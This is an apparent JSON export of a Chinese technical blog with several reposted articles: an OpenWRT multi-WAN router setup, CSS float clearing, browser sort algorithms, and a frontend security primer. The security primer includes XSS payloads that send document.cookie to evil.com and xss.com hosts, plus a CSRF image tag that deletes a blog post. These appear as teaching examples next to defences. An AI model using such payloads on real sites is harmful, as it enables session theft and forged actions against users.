/path/to/openwrt-ar71xx-nand-wndr4300-ubi-factory.imgtftp&gt; quit 同样的，把上面的路径改成 img 的实际路径即可 安装完成后，登录 LuCI 的面板 http://192.168.1.1，初始用户名为 root，初始密码为 password 配置多线多拨安装好 LEDE 之后，别的 wifi 什么的配置就不多说了，这些都没有什么问题，这里要解决的是多线多拨的问题，一开始我在这里卡了很久，折腾了半天终于给弄出来了。 给交换机划分 vlan在 网络 =&gt; 交换机 \b中添加一行新的 vlan 把 CPU 列设成 “已标记”，把需要转 WAN 的 LAN 口改成 “未标记”。然后 VLAN 1 上对应的端口也要设为 “关” PS：这里端口状态“未标记”(untagged)，即该端口作为本 VLAN 成员，进行二层交换；若选择“已标记”(tagged)，端口之间通信无二层交换，而是冲突广播（hub 方式） 添加接口配置在 网络 =&gt; 接口 中添加新的接口配置 然后建好接口后把 PPPoE 的\b用户名和密码自己填上接着给这个接口新增一个防火墙域叫’wanb’ 的 接着要给不同的接口配置不同的跃点数，避免路由失效 配置防火墙域在 网络 =&gt; 防火墙 中把对应的规则也给添加进去 配置 MWAN 负载均衡接着在 网络 =&gt; 负载均衡 给配置一下 MWAN3 的相关配置由于我给接口起的名字是 wanb，MWAN3 默认就有这个\b配置，所以相关的配置工作量也就减少了启用接口： 最后，根据自己的需要，在规则这边选择规则，我这里\b我这里选择了 wan 优先的策略 修改 MAC 地址由于新增的 eth0.3 没有配置 MAC 地址，所以新增接口会沿用 eth0 的 MAC 地址，导致 MAC 地址冲突，所以这里还要加一个步骤，就是给 eth0.3 配置 MAC 地址 PS：可在命令行中输入 ip a show 查看本地的所有 MAC 地址 ssh 进入路由器1ssh root@192.168.1.1 打开网络配置文件1vi /etc/config/network 在 wanb 的配置前面添加以下配置123config device &apos;wanb_dev&apos; option name &apos;eth0.3&apos; option macaddr &apos;c0:ff:d4:b3:64:f7&apos; 保存退出，然后重启 eth0.3 接口12ifdown wanbifup wanb 配完之后最好重启一下路由器，再看看 状态 =&gt; 概览，如果有两个 IPv4 的上游就说明配置成功了，这样子就解决了 MAC 地址冲突带来的问题 整个多线多拨到这里就算实现了","categories":[{"name":"日常运维","slug":"日常运维","permalink":"https://hexo.bangz.me/categories/日常运维/"},{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://hexo.bangz.me/tags/Linux基础/"},{"name":"操作系统","slug":"操作系统","permalink":"https://hexo.bangz.me/tags/操作系统/"},{"name":"OpenWRT","slug":"OpenWRT","permalink":"https://hexo.bangz.me/tags/OpenWRT/"}]},{"title":"清除浮动的四种方式及其原理理解","slug":"principle-of-clear-float-in-four-ways","date":"2018-08-14T13:37:10.000Z","updated":"2018-08-15T02:40:54.000Z","comments":true,"path":"archives/principle-of-clear-float-in-four-ways.html","link":"","permalink":"https://hexo.bangz.me/archives/principle-of-clear-float-in-four-ways.html","excerpt":"转自：https://juejin.im/post/59e7190bf265da4307025d91 本文介绍了四种清除浮动的方法，并尝试解释其原理。在理解了各种清除浮动的原理之后，你会发现，很多清除浮动的方法本质上其实是一样的。掌握这些原理，相信你可以根据场景和需求，灵活运用原则发展出不同的清除浮动的方法，而不再死记或拘泥于文中提到的方法。","text":"转自：https://juejin.im/post/59e7190bf265da4307025d91 本文介绍了四种清除浮动的方法，并尝试解释其原理。在理解了各种清除浮动的原理之后，你会发现，很多清除浮动的方法本质上其实是一样的。掌握这些原理，相信你可以根据场景和需求，灵活运用原则发展出不同的清除浮动的方法，而不再死记或拘泥于文中提到的方法。 一、为什么要清除浮动在讲清除浮动的方法之前，我们先来了解一下为什么要清除浮动，清除浮动的目的是什么，即，要解决什么样的问题。来看一个浮动的例子(略去了文字内容)：12345&lt;div class=\"topDiv\"&gt; &lt;div class=\"floatDiv\"&gt;float left&lt;/div&gt; &lt;div class=\"textDiv\"&gt;...&lt;/div&gt;&lt;/div&gt;&lt;div class=\"bottomDiv\"&gt;...&lt;/div&gt; 其样式为：12345678910111213141516171819202122.topDiv &#123; width: 500px; border: 2px solid black;&#125;.floatDiv &#123; width: 100px; height: 100px; border: 2px dotted red; color: red; margin: 4px; float: left;&#125;.bottomDiv &#123; width: 500px; height: 100px; margin: 5px 0; border: 2px dotted black;&#125;.textDiv &#123; color: blue; border: 2px solid blue;&#125; 在 chrome 中渲染的效果如下图所示： 这肯定不是我们想要的渲染效果，它可能存在如下问题： 文字围绕浮动元素排版，但我们可能希望文字（.textDiv）排列在浮动元素下方，或者，我们并不希望 .textDiv 两边有浮动元素存在。 浮动元素排版超出了其父级元素（.topDiv），父元素的高度出现了塌缩，若没有文字高度的支撑，不考虑边框，父级元素高度会塌缩成零。 浮动元素甚至影响到了其父元素的兄弟元素（.bottomDiv）排版。因为浮动元素脱离了文档流，.bottomDiv 在计算元素位置的时候会忽略其影响，紧接着上一个元素的位置继续排列。 解决第一个问题，需要清除 .textDiv 周围的浮动，而解决第二个问题，因为父元素的兄弟元素位置只受父元素位置的影响，就需要一种方法将父级元素的高度撑起来，将浮动元素包裹在其中，避免浮动元素影响父元素外部的元素排列。 接下来开始介绍清除浮动的方法。 二、清除浮动的方法1. 利用 clear 样式还是开篇的例子，我们给需要清除浮动的元素添加如下样式：123456.textDiv &#123; color: blue; border: 2px solid blue; clear: left;&#125; 清除浮动后的渲染效果如下： 解释一下： 通过上面的样式，.textDiv 告诉浏览器，我的左边不允许有浮动的元素存在，请清除掉我左边的浮动元素。然而，因为浮动元素（.floatDiv）位置已经确定，浏览器在计算 .textDiv 的位置时，为满足其需求，将 .textDiv 渲染在浮动元素下方，保证了 .textDiv 左边没有浮动元素。同时可以看出，父元素的高度也被撑起来了，其兄弟元素的渲染也不再受到浮动的影响，这是因为 .textDiv 仍然在文档流中，它必须在父元素的边界内，父元素只有增加其高度才能达到此目的，可以说是一个意外收获。(clear 的值为 both 也有相同的效果，通俗理解就是，哪边不允许有浮动元素，clear 就是对应方向的值，两边都不允许就是 both)但是，如果我们把 HTML 中的 .floatDiv 和 .textDiv 交换一下位置呢？12345&lt;div class=\"topDiv\"&gt; &lt;div class=\"textDiv\"&gt;...&lt;/div&gt; &lt;div class=\"floatDiv\"&gt;float left&lt;/div&gt;&lt;/div&gt;&lt;div class=\"bottomDiv\"&gt;...&lt;/div&gt; 无论 .textDiv 是否应用清除浮动，情况都是下面的样子： .textDiv 的位置先确定了，于是浮动元素就紧接着 .textDiv 下方渲染在父元素的左侧。然而，父元素的高度并没有被撑起来，没有将浮动影响“内化”，导致浮动影响到了接下来的元素排版。看来，为达到撑起父元素高度的目的，使用 clear 清除浮动的方法还是有适用范围的。我们需要更加通用和可靠的方法。（这里澄清一下，单从元素清除浮动的角度，clear 完全已经达到了目的，它已经使得 .textDiv 特定的方向上不再有浮动元素，清除浮动其实仅仅针对需要清除浮动的元素本身而言，只关注自身需求是否达到，和外界没有什么关系，它不关注浮动是否超出父元素，以及浮动是否影响到后续元素排列。我们只是利用了浮动的一些特性达到某些目的，但这不是清除浮动关心的问题，只不过，相对于清除浮动，我们可能更加关心这些特性能为我们做些什么而已。我的理解是，清除浮动和撑起父元素高度其实是两个不同的问题，在这里，可以简单地理解为工具和目的之间的关系，接下来要讨论的两个方法都是在利用清除浮动这个工具在解决问题，它并不是清除浮动这个工具本身。不过，我们经常将两者混为一谈。sorry，有点啰嗦，看不懂就是我没表达清楚，跳过即可。。。） 2. 父元素结束标签之前插入清除浮动的块级元素HTML 结构如下，在有浮动的父级元素的末尾插入了一个没有内容的块级元素 div：123456&lt;div class=\"topDiv\"&gt; &lt;div class=\"textDiv\"&gt;...&lt;/div&gt; &lt;div class=\"floatDiv\"&gt;float left&lt;/div&gt; &lt;div class=\"blankDiv\"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=\"bottomDiv\"&gt;...&lt;/div&gt; 应用样式：1234567891011121314151617181920212223242526.topDiv &#123; width: 500px; border: 2px solid black;&#125;.floatDiv &#123; width: 100px; height: 100px; border: 2px dotted red; color: red; margin: 4px; float: left;&#125;.bottomDiv &#123; width: 500px; height: 100px; margin: 5px 0; border: 2px dotted black;&#125;.textDiv &#123; color: blue; border: 2px solid blue;&#125;// 区别在这里.blankDiv &#123; clear: both; // or left&#125; 渲染效果如下： 原理无需多讲，和第一个例子里 .textDiv 应用 clear 清除浮动，撑起父级元素高度的原理完全一样。这里强调一点，即，在父级元素末尾添加的元素必须是一个 块级元素 ，否则无法撑起父级元素高度。 3. 利用伪元素（clearfix）HTML 结构如下，为了惯例相符，在 .topDiv 的 div 上再添加一个 clearfix 类：12345&lt;div class=\"topDiv clearfix\"&gt; &lt;div class=\"textDiv\"&gt;...&lt;/div&gt; &lt;div class=\"floatDiv\"&gt;float left&lt;/div&gt;&lt;/div&gt;&lt;div class=\"bottomDiv\"&gt;...&lt;/div&gt; 样式应用如下：12345678// 省略基本的样式// 区别在这里.clearfix:after &#123; content: '.'; height: 0; display: block; clear: both;&#125; 该样式在 clearfix ，即父级元素的最后，添加了一个 :after 伪元素，通过清除伪元素的浮动，达到撑起父元素高度的目的。注意到该伪元素的 display 值为 block，即，它是一个不可见的块级元素（有的地方使用 table，因为 table 也是一个块级元素）。你可能已经意识到，这也只不过是前一种清除浮动方法（添加空白 div）的另一种变形，其底层逻辑也是完全一样的。前面的三种方法，其本质上是一样的。 4. 利用 overflow 清除浮动首先直观地看看，overflow 是如何清除浮动的。HTML 结构如下：12345&lt;div class=\"topDiv\"&gt; &lt;div class=\"floatDiv\"&gt;float left&lt;/div&gt; &lt;div class=\"textDiv\"&gt;...&lt;/div&gt;&lt;/div&gt;&lt;div class=\"bottomDiv\"&gt;...&lt;/div&gt; 样式应用如下：123456789101112131415161718192021222324252627.topDiv &#123; width: 500px; padding: 4px; border: 2px solid black; // 区别在这里 overflow: auto;&#125;.floatDiv &#123; width: 100px; height: 100px; border: 2px dotted red; color: red; margin: 4px; float: left;&#125;.bottomDiv &#123; width: 500px; height: 100px; margin: 5px 0; border: 2px dotted black; clear: both;&#125;.textDiv &#123; color: blue; border: 2px solid blue;&#125; 不应用上面标识出来的 CSS 时，渲染结果和本文开始的第一个图形效果相同，应用 CSS 后的渲染效果如下： 仅仅只在父级元素上添加了一个值为 auto 的 overflow 属性，父元素的高度立即被撑起，将浮动元素包裹在内。看起来，浮动被清除了，浮动不再会影响到后续元素的渲染（严格讲，这和清除浮动没有一点关系，因为不存在哪个元素的浮动被清除，不纠结这个问题）。其实，这里的 overflow 值，还可以是除了 “visible” 之外的任何有效值，它们都能达到撑起父元素高度，清除浮动的目的。不过，有的值可能会带来副作用，比如，scroll 值会导致滚动条始终可见，hidden 会使得超出边框部分不可见等。那它们是如何做到浮动清除的呢？ 要讲清楚这个解决方案的原理，有一个概念始终是绕不过去，那就是块格式化上下文(BFC), 然而这又是一个非常抽象的概念，如果要清楚地把这个概念讲出来，恐怕需要非常大的篇幅，这里仅提及和理解该问题相关的内容。 这是从 MDN 上摘下来的 BFC 定义： A block formatting context is a part of a visual CSS rendering of a Web page. It is the region in which the layout of block boxes occurs and in which floats interact with each other. 翻译过来就是：块级格式化上下文是 CSS 可视化渲染的一部分。它是一块区域，规定了内部块盒的渲染方式，以及浮动相互之间的影响关系。块格式化上下文（BFC）有下面几个特点： BFC 是就像一道屏障，隔离出了 BFC 内部和外部，内部和外部区域的渲染相互之间不影响。BFC 有自己的一套内部子元素渲染的规则，不影响外部渲染，也不受外部渲染影响。 BFC 的区域不会和外部浮动盒子的外边距区域发生叠加。也就是说，外部任何浮动元素区域和 BFC 区域是泾渭分明的，不可能重叠。 BFC 在计算高度的时候，内部浮动元素的高度也要计算在内。也就是说，即使 BFC 区域内只有一个浮动元素，BFC 的高度也不会发生塌缩，高度是大于等于浮动元素的高度的。 HTML 结构中，当构建 BFC 区域的元素紧接着一个浮动盒子时，即，是该浮动盒子的兄弟节点，BFC 区域会首先尝试在浮动盒子的旁边渲染，但若宽度不够，就在浮动元素的下方渲染。[看这里] 有了这几点，就可以尝试解释为什么 overflow （值不为 visible）可以清除浮动了。当元素设置了 overflow 样式，且值不为 visible 时，该元素就建构了一个 BFC(哪些情况下，元素可以建构出 BFC，可以看查看 CSS 文档对 BFC 的定义)。在我们的例子中，.topDiv 因设置了值为 auto 的 overflow 样式，所以该元素建构出一个 BFC，按照第三个特点，BFC 的高度是要包括浮动元素的，所以 .topDiv 的高度被撑起来，达到了清除浮动影响的目的。(至于为什么值为 visible 的 overflow 不能建构 BFC，这个答案给了一个解释) 其实，这里 overflow 的作用就是为了构建一个 BFC 区域，让内部浮动的影响都得以“内化”。如果你看了BFC 的定义，你会发现，构建一个 BFC 区域的方法有很多种，overflow 只是其中的一种，那在这里，我们是否也可以利用其它的方式构建 BFC，且同样能达到清除浮动的目的呢？ BFC 定义中说，inline-block 同样也能构建 BFC，那我们就用该样式来试试：123456789.topDiv &#123; width: 500px; padding: 4px; border: 2px solid black; // 区别在这里 display: inline-block;&#125;// 其他样式相同，省略 渲染效果如下： 效果完全一样！只要我们理解了原理，就可以灵活演变出不同的清除浮动的方法，而不必死记某种手段。 当然，要说明的是，在实际项目中选择采用哪种方式构建 BFC 是要具体问题具体分析的，因为要考虑到选用的样式自身的作用和影响。这个例子中，选用 inline-block 和选用 overflow 效果完全一样，没有看出有什么副作用，但不代表在其他项目中一样能行得通。甚至对 overflow 值的选择也要考虑其表现和影响。在各种构建 BFC 的方式中，overflow 方式可能是外部影响更可控的一种，我猜想这也许就是为什么普遍采用 overflow 来清除浮动的原因吧。 到这里，我要分享的清除浮动的方法已经讲完了。其实，如果在不同的使用场景下，对这几个方法进行拆分组合(其实是对底层原理的拆分组合)，还可以实现其他形式不同的清除浮动的方法，最重要的还是对底层原理的把握。知其然，亦知其所以然才是最有效的学习方式。 下面是文中涉及的链接汇总： MDN 对 BFC 的定义 CSS 文档对 BFC 的定义和解释，BFC 如何创建，BFC 内部渲染规则 为什么 overflow 的值为 visible 时，无法清除浮动，而其他值可以，Stack Overflow 上的一个回答 BFC 紧跟浮动元素时如何渲染","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"HTML5","slug":"HTML5","permalink":"https://hexo.bangz.me/tags/HTML5/"},{"name":"CSS3","slug":"CSS3","permalink":"https://hexo.bangz.me/tags/CSS3/"},{"name":"前端","slug":"前端","permalink":"https://hexo.bangz.me/tags/前端/"}]},{"title":"深入浅出浏览器 js 的数组排序算法","slug":"sort-algorithm-implement-in-browser","date":"2018-08-11T02:42:40.000Z","updated":"2018-08-11T03:24:39.000Z","comments":true,"path":"archives/sort-algorithm-implement-in-browser.html","link":"","permalink":"https://hexo.bangz.me/archives/sort-algorithm-implement-in-browser.html","excerpt":"转自：https://segmentfault.com/a/1190000010648740 本文要解决的问题1、找出 Array.prototype.sort 使用的什么排序算法 2、用一种直观的方式展示 Array.prototype.sort 的时间复杂度，看看它有多快？ 3、实际开发中要注意的问题","text":"转自：https://segmentfault.com/a/1190000010648740 本文要解决的问题1、找出 Array.prototype.sort 使用的什么排序算法 2、用一种直观的方式展示 Array.prototype.sort 的时间复杂度，看看它有多快？ 3、实际开发中要注意的问题 Array.prototype.sort 各浏览器的算法实现ECMAScript 5.1 ECMAScript 6.0 ECMAScript 草案 看完上面三个规范中 Array.prototype.sort 部分，我们会发现 ECMAScript 不同版本规范对 Array.prototype.sort 的定义中没有要求用什么样的排序方式实现 sort() 方法，也没有要求是否要采用稳定排序算法（下文会解释什么是稳定排序算法）。 因此各浏览器都给出自己的实现方式： 表格内容部分来自于维基百科 浏览器 使用的 JavaScript 引擎 排序算法 源码地址 Google Chrome V8 插入排序和快速排序 sort 源码实现 Mozilla Firefox SpiderMonkey 归并排序 sort 源码实现 Safari Nitro（JavaScriptCore） 归并排序和桶排序 sort 源码实现 Microsoft Edge 和 IE(9+) Chakra 快速排序 sort 源码实现 源码分析V8 引擎的一段注释 12// In-place QuickSort algorithm.// For short (length &lt;= 10) arrays, insertion sort is used for efficiency. Google Chrome 对 sort 做了特殊处理，对于长度 &lt;= 10 的数组使用的是插入排序(稳定排序算法) ，&gt;10 的数组使用的是快速排序。快速排序是不稳定的排序算法。 但是很明显比我们常见的快速排序要复杂得多，不过核心算法还是快速排序。算法复杂的原因在于 v8 出于性能考虑进行了很多优化。 再看 safari Nitro 引擎的一段代码 12345678910111213141516171819202122232425if (typeof comparator == \"function\") comparatorSort(array, length, comparator);else if (comparator === null || comparator === @undefined) stringSort(array, length); 省略....function stringSort(array, length)&#123; var valueCount = compact(array, length); var strings = @newArrayWithSize(valueCount); for (var i = 0; i &lt; valueCount; ++i) strings[i] = &#123; string: @toString(array[i]), value: array[i] &#125;; bucketSort(array, 0, strings, 0);&#125; 省略....function comparatorSort(array, length, comparator)&#123; var valueCount = compact(array, length); mergeSort(array, valueCount, comparator);&#125; 默认使用的桶排序，如果 sort 传入的自定义函数作为参数，就是用归并排序（稳定排序算法） Firefox 源码就不贴了，上面的表格有源码地址，使用的稳定排序算法 — 归并算法。Microsoft Edge 和 IE(9+) 使用的不稳定排序算法 - 快速排序。但是 IE（6、7、8）使用的稳定算法。 各种算法的对比 排序类型 平均情况 最好情况 最坏情况 辅助空间 稳定性 快速排序 O(nlogn) O(nlogn) O(n²) O(nlogn) 不稳定 归并排序 O(nlogn) O(nlogn) O(nlogn) O(n) 稳定 插入排序 O(n²) O(n) O(n²) O(1) 稳定 桶排序 O(n+k) O(n+k) O(n²) O(n+k) (不)稳定 注: 桶排序的稳定性取决于桶内排序的稳定性, 因此其稳定性不确定。 算法时间复杂度 在进行算法分析时，语句总的执行次数 T(n)是关于问题规模 n 的函数， 进而分析 T(n)随着 n 的变化情况并确定 T(n)的数量级。 算法的时间复杂度，也就是算法的时间度量，记作：T(n)=O(f(n))。 它表示随问题规模 n 的增大，算法执行时间的增长率和 f(n)的增长率相同， 称作算法的时间复杂度，简称为时间复杂度。 其中 f(n)是问题规模 n 的某个函数。 常用的时间复杂度所耗费的时间从小到大依次是 O(1) &lt; O(logn) &lt; O(n) &lt; O(nlogn) &lt; O(n²) &lt; O(n³) &lt; O(2^n) &lt; O(n!) &lt; O(n^n) 图片来源 算法的时间复杂度与运行时间有一些常见的比例关系 查看图表来源 复杂度 10 20 50 100 1,000 10,000 100,000 O(1) &lt; 1s &lt; 1s &lt; 1s &lt; 1s &lt; 1s &lt; 1s &lt; 1s O(log(n)) &lt; 1s &lt; 1s &lt; 1s &lt; 1s &lt; 1s &lt; 1s &lt; 1s O(n) &lt; 1s &lt; 1s &lt; 1s &lt; 1s &lt; 1s &lt; 1s &lt; 1s O(n*log(n)) &lt; 1s &lt; 1s &lt; 1s &lt; 1s &lt; 1s &lt; 1s &lt; 1s O(n²) &lt; 1s &lt; 1s &lt; 1s &lt; 1s &lt; 1s 2 s 3-4 min O(n³) &lt; 1s &lt; 1s &lt; 1s &lt; 1s 20 s 5 hours 231 days O(2^n) &lt; 1s &lt; 1s 260 days hangs hangs hangs hangs O(n!) &lt; 1s hangs hangs hangs hangs hangs hangs O(n^n) 3-4 min hangs hangs hangs hangs hangs hangs 维基百科关于算法稳定性的解释 当相等的元素是无法分辨的，比如像是整数，稳定性并不是一个问题。然而，假设以下的数对将要以他们的第一个数字来排序。 (4, 1) (3, 1) (3, 7)（5, 6） 在这个状况下，有可能产生两种不同的结果，一个是让相等键值的纪录维持相对的次序，而另外一个则没有： (3, 1) (3, 7) (4, 1) (5, 6) (维持次序） (3, 7) (3, 1) (4, 1) (5, 6) （次序被改变） 想看自己浏览器排序算法的稳定性？ 点我 各种排序算法实现有多快？我们先通过这个 在线网站 大体测试一下 对一个有 10000 个元素的数组，快速排序 &gt; 归并排序 &gt;&gt;&gt; 插入排序而且插入排序大于 1s 了。 对于一个只有 10 个元素的数组，插入排序 &gt; 快速排序这也说明了为什么 chrome 在小于等于 10 个元素的小数组使用插入排序的原因了。 浏览器的实现不同有什么影响排序算法不稳定有什么影响 举个例子： 某市的机动车牌照拍卖系统，最终中标的规则为： 1、按价格进行倒排序； 2、相同价格则按照竞标顺位（即价格提交时间）进行正排序。 排序若是在前端进行，那么采用快速排序的浏览器中显示的中标者很可能是不符合预期的。 解决办法 Array.prototype.sort 在不同浏览器中的差异和解决办法 大体的思路就是，自己写一个稳定的排序函数，以保持各浏览器的一致性。 工具1、在线排序算法对比网站2、排序算法视觉图 扩展阅读1、快速排序（Quicksort）的 Javascript 实现2、JS 中可能用得到的全部的排序算法3、7 种常用的排序算法 - 可视化4、深入了解 javascript 的 sort 方法5、JavaScript 排序算法汇总 参考文档聊聊前端排序的那些事排序算法JavaScript 排序算法汇总","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://hexo.bangz.me/tags/javascript/"},{"name":"前端","slug":"前端","permalink":"https://hexo.bangz.me/tags/前端/"},{"name":"ECMAScript","slug":"ECMAScript","permalink":"https://hexo.bangz.me/tags/ECMAScript/"}]},{"title":"浅谈前端安全","slug":"about-frontend-security","date":"2018-08-10T02:32:54.000Z","updated":"2018-08-10T04:06:16.000Z","comments":true,"path":"archives/about-frontend-security.html","link":"","permalink":"https://hexo.bangz.me/archives/about-frontend-security.html","excerpt":"转自：https://cloud.tencent.com/developer/article/1136202 安全问题的分类按照所发生的区域分类 后端安全问题：所有发生在后端服务器、应用、服务当中的安全问题 前端安全问题：所有发生在浏览器、单页面应用、Web 页面当中的安全问题 按照团队中哪个角色最适合来修复安全问题分类 后端安全问题：针对这个安全问题，后端最适合来修复 前端安全问题：针对这个安全问题，前端最适合来修复 综合以上 前端安全问题：发生在浏览器、前端应用当中或者通常由前端开发工程师来对其进行修复的安全问题","text":"转自：https://cloud.tencent.com/developer/article/1136202 安全问题的分类按照所发生的区域分类 后端安全问题：所有发生在后端服务器、应用、服务当中的安全问题 前端安全问题：所有发生在浏览器、单页面应用、Web 页面当中的安全问题 按照团队中哪个角色最适合来修复安全问题分类 后端安全问题：针对这个安全问题，后端最适合来修复 前端安全问题：针对这个安全问题，前端最适合来修复 综合以上 前端安全问题：发生在浏览器、前端应用当中或者通常由前端开发工程师来对其进行修复的安全问题 浏览器安全同源策略 是一种约定，是浏览器最核心也最基本的安全功能，限制了来自不同源的 document 或者脚本，对当前 document 读取或设置某些属性 影响 “源” 的因素有：host（域名或者 IP 地址）、子域名、端口、协议 对浏览器来说，DOM、Cookie、XMLHttpRequest 会受到同源策略的限制 不受同源策略的标签&lt;script&gt;、&lt;img&gt;、&lt;iframe&gt;、&lt;link&gt; 等标签都可以跨域加载资源，而不受同源策略的限制 这些带 “src” 属性的标签每次加载时，浏览器会发起一次 GET 请求 通过 src 属性加载的资源，浏览器限制了 javascript 的权限，使其不能读、写返回的内容 三大前端安全问题1、跨站脚本攻击（XSS）定义 英文全称：Cross Site Script，XSS 攻击，通常指黑客通过 “HTML 注入” 篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击 本质是一种“HTML 注入”，用户的数据被当成了 HTML 代码一部分来执行，从而产生了新的语义 XSS 的分类1、反射型 XSS：将用户输入的数据反射给浏览器。黑客需要诱使用户 “点击” 一个恶意链接，才能攻击成功。举个例子： 假设在某购物网站上搜商品，当搜不到商品时会出现 此时的 URL 是 https://category.vip.com/suggest.php?keyword=xss&amp;ff=235|12|1|1 在搜索框输入 &lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; 如果前端页面没有对搜索框的内容进行过滤，而是直接发送，这时，URL 地址栏应该会显示 https://category.vip.com/suggest.php?keyword=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&amp;ff=235|12|1|1，从而 alert 出 xss，但事实却是已经转码了的：https://category.vip.com/suggest.php?keyword=%3Cscript%3Ealert(%27xss%27)%3C%2Fscript%3E&amp;ff=235|12|1|1 假设前端页面没有进行处理，那么攻击者就可以通过构造来获取用户的 cookie 的地址，来诱使用户来访问这个地址，比如说 https://category.vip.com/suggest.php?keyword=&lt;script&gt;document.location=&#39;http://xss.com/get?cookie=&#39;+document.cookie&lt;/script&gt;&amp;ff=235|12|1|1 2、存储型 XSS：把用户输入的数据 “存储” 在服务器端，这种 XSS 具有很强的稳定性。比如说，黑客写下一篇包含恶意 javascript 代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在浏览器中执行这段恶意的 javascript 代码，黑客把恶意的脚本保存到服务器端 3、DOM Based XSS：通过修改页面的 DOM 节点形成的 XSS。举个例子： 在输入框中输入内容后点击 write 此时再点击 a 链接 原理： 首先用一个单引号闭合掉 href 的第一个单引号，然后插入一个 onclick 事件，最后再用注释符 “//“ 注释掉第二个单引号。点击此链接，脚本将被执行。 XSS Payload 攻击定义 XSS 攻击成功后，攻击者能够对用户当前浏览的页面植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些用以完成各种具体功能的恶意脚本，被称为 XSS Payload。实际上就是 Javascript 脚本（或者 Flash 或其他富客户端的脚本），所以 XSS Payload 能够做到任何 javascript 脚本能实现的功能 实例 通过读取浏览器的 cookie 对象，从而发起 “cookie 劫持” 攻击 攻击者首先加载一个远程脚本 http://www.a.com/test.htm?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js&gt;&lt;/script&gt; 真正的 XSS Payload 写在这个远程脚本中，避免直接在 URL 的参数里写入大量的 Javascript 代码 在 evil.js 中，通过如下代码窃取 cookie var img = document.createElement(&quot;img&quot;); img.src = &quot;http://www.evil.com/log?&quot;+escape(document.cookie); document.body.appendChild(img); 以上代码在页面中插入了一张看不见的图片，同时把 document.cookie 对象作为参数发送到远程服务器中 http://www.evil.com/log 并不一定要存在，因为这个请求会在远程服务器的 Web 日志中留下记录 127.0.0.1 - - [119/Jul/2010:11:30:42 + 0800] &quot;GET /log?cookie1%3D1234 HTTP/1.1&quot; 404 288 通过模拟 GET、POST 请求操作用户的浏览器（在 “cookie 劫持” 失效时，或者目标用户的网络不能访问互联网等情况时会非常有用） 假设某博客页面存在 XSS 漏洞，那么可以通过构造 get 请求操作用户浏览器 假设正常删除博客文章的链接为 http://blog.test.com/manage/entry.do?m=delete&amp;id=1245862 对于攻击者来说，只需要知道文章的 id，就能够通过这个请求来删除这篇文章 攻击者可以通过插入一张图片来发起一个 get 请求 攻击者只需要让博客作者执行这段 javascript 代码也就是 XSS Payload，就会删除这篇文章 XSS 的防御1、HttpOnly 浏览器禁止页面的 Javascript 访问带有 HttpOnly 属性的 cookie。（实质解决的是：XSS 后的 cookie 劫持攻击）如今已成为一种 “标准” 的做法 不同语言给 cookie 添加 HttpOnly 的方式不同，比如 JavaEE：response.setHeader(&quot;Set-Cookie&quot;,&quot;cookiename=value; Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly&quot;); PHP4：header(&quot;Set-Cookie:hidden=value;httpOnly&quot;); PHP5：setcookie(&quot;abc&quot;,&quot;test&quot;,NULL,NULL,NULL,NULL,TRUE); //true 为 HttpOnly 属性 2、输入检查（XSS Filter） 原理：让一些基于特殊字符的攻击失效。（常见的 Web 漏洞如 XSS、SQLInjection 等，都要求攻击者构造一些特殊字符） 输入检查的逻辑，必须放在服务器端代码中实现。* 目前 Web 开发的普遍做法，是同时哎客户端 Javascript 中和服务端代码中实现相同的输入检查。客户端的输入检查可以阻挡大部分误操作的正常用户，节约服务器资源。 3、输出检查 在变量输出到 HTML 页面时，使用编码或转义的方式来防御 XSS 攻击 针对 HTML 代码的编码方式：HtmlEncode PHP：htmlentities()和 htmlspecialchars()两个函数 Javascript：JavascriptEncode（需要使用 “\\” 对特殊字符进行转义，同时要求输出的变量必须在引号内部） 在 URL 的 path（路径）或者 search（参数）中输出，使用 URLEncode具体实施可以参考：http://www.cnblogs.com/lovesong/p/5211667.html 防御 DOM Based XSS DOM Based XSS 的形成： （举个例子） 实质： 从 Javascript 中输出数据到 HTML 页面里 这个例子的解决方案： 做一次 HtmlEncode 防御方法：分语境使用不同的编码函数 总结XSS 漏洞虽然复杂，但是却是可以彻底解决的。在设计解决方案时，应该针对不同场景理解 XSS 攻击的原理，使用不同的方法 2、CSRF（跨站点请求伪造）什么是 CSRF首先来看个例子： 攻击者首先在自己的域构造一个页面：http://www.a.com/csrf.html，其内容为 &lt;img src=&quot;http://blog.sohu.com/manage/entry.do?m=deleted&amp;id=156714243&quot; /&gt;使用了一个 img 标签，其地址指向了删除 Iid 为 156714243 的博客文章然后攻击者诱使目标用户，也就是博客主人访问这个页面用户进去看到一张无法显示的图片，这时自己的那篇博客文章已经被删除了 原理： 在刚才访问 http://www.a.com/csrf.html 页面时，图片标签向服务器发送了一次 get 请求，这次请求导致了博客文章被删除 这种删除博客文章的请求，是攻击者伪造的，所以这种攻击就叫做“跨站点请求伪造” CSRF 的原理 参考上图，我们可以总结，完成一次 CSRF 攻击，必须满足两个条件 用户登录受信任网站 A，并且在本地生成 Cookie 在不登出网站 A 的情况下，访问危险网站 B CSRF 本质 CSRF 攻击是攻击者利用用户身份操作用户账户的一种攻击方式 CSRF 的防御CSRF 能攻击成功的本质原因： 重要操作的所有参数都是可以被攻击者猜测到的 解决方案1、验证码CSRF 攻击过程中，用户在不知情的情况下构造了网络请求，添加验证码后，强制用户必须与应用进行交互 优点：简洁而有效 缺点：网站不能给所有的操作都加上验证码 2、Referer Check 利用 HTTP 头中的 Referer 判断请求来源是否合法Referer 首部包含了当前请求页面的来源页面的地址 优点：简单易操作（只需要在最后给所有安全敏感的请求统一添加一个拦截器来检查 Referer 的值就行） 缺点：服务器并非什么时候都能取到 Referer 很多出于保护用户隐私的考虑，限制了 Referer 的发送。 比如从 HTTPS 跳转到 HTTP，出于安全的考虑，浏览器不会发送 Referer 浏览器兼容性 关于 Referer 